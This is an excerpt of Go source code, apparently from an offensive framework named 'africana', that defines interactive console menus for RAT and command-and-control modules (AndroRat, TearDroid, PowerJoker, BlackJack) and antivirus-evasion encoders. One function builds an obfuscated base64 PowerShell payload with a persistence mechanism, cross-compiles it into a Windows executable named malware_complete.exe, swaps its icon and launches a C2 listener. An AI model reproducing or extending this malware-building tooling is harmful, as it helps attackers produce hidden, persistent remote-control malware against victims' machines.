...
func AndroRat() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "androids/androrat_c2_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
...
func TearDroid() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "androids/teardroid_c2_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
...
func Chameleon() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/chameleon_evasion_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
...
func Gh0x0st() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/ghost_evasion_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
...
func PowerJoker() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/powerjoker_c2_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
...
func BlackJack() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/blackjack_c2_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
...
func ShikataGanai() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/shikata_ga_nai_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
        ...
        if buildParts[0] == "run" || buildParts[0] == "start" || buildParts[0] == "launch" || buildParts[0] == "exploit" || buildParts[0] == "execute" {
            ...
            if userListener == "tcp" {
                ...
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Combiling base64 payload with persisten mechanisim...\n" + bcolors.DARKGREY)
                ...
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Obfsicating powershell payload & encoding to base64...\n" + bcolors.DARKGREY + `powershell -w 1 -enc "%s"` + "\n" + bcolors.ENDC , encoded)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Combiling base64 payload with persistent mechanisim...\n" + bcolors.DARKGREY)
                subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -v -x -o /root/.africana/output/malware_complete.exe /root/.africana/output/malware_complete.go`)
                IconChanger(userIcon)
                fmt.Printf(bcolors.YELLOW + "\n[>] " + bcolors.ENDC + "Launching %s c2...", userC2)
...
func ListenersLauncher() {
    ...
    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "windows/listeners_launcher_func.go" + bcolors.ENDC + ")" + bcolors.GREEN + " > " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)
